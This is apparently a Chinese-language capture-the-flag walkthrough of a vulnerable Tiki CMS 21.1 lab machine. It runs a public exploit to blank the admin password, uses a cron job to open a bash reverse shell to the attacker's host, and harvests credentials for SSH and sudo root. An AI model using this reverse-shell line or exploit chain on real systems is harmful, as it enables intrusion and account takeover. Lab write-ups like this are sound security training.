# Tiki

- victim
  - 192.168.159.129
- local
  - 192.168.159.6

---

## 扫描结果分析

简单扫描看起来是Windows，但是完整扫完基本上能确定是Linux了，测试下主要的80端口上的Web服务

## Web服务分析

根据robots.txt，进入`/tiki/`，跳转到

```
http://192.168.159.129/tiki/tiki-index.php
```

gobuster也扫一下，所有30x跳转都回到主页，看看README

获取到版本号

```
tiki cms
Version 21.1
```

EDB唯一的一个结果

```
https://www.exploit-db.com/exploits/48927
```

### EDB EXP利用

```bash
proxychains4 wget https://www.exploit-db.com/raw/48927 -O exp.py
chmod +x exp.py
sed -i 's/\r$//' exp.py
# 删除多余注释，正确化第一行注释引导向python3
./exp.py
 
./exp.py 192.168.159.129
```

```
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password
```

可以无密码登录admin了，但是按照要求说是要用BurpSuite（不填写密码无法点击登陆），成功登录

### 获取Shell

获取到管理员了，发现有定时任务，先利用其收集一些信息（保存在`sysinfo.md`），然后利用其反弹shell

指令（因为格式问题，所以只能套一层了）

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.159.6/4444 0>&1"
```

成功获取shell，得到www-data用户

## 升级到User Shell

随便浏览了下，在`/home/silky/Note`看到Mail.txt，收集到一对密码，先考虑下密码重用

```bash
ssh silky@192.168.159.129
```

无法密码重用，那就登录到CMS看看吧（有个小BUG，不退出shell，也就是Cron任务没结束就没法继续运行Web应用）

进去后，各种浏览，找到提示

```
http://192.168.159.129/tiki/tiki-index.php?page=Silkys-Homepage
```

查看历史版本，找到提示说的CVE

```
CVE-2020-15906
```

没锤子用，这个CVE我已经用过了

重新回到Admin账号，浏览页面，看到

```
http://192.168.159.129/tiki/tiki-index.php?page=Credentials
```

收集到账号密码，扔到`accounts.md`并尝试登录

成功获取User SSH Shell

## Privilege Escalation

尝试LinEnum

发现我们是Sudoer，直接`sudo -i`输入密码完事了

flag.txt

```
flag:88d8120f434c3b4221937a8cd0668588
```

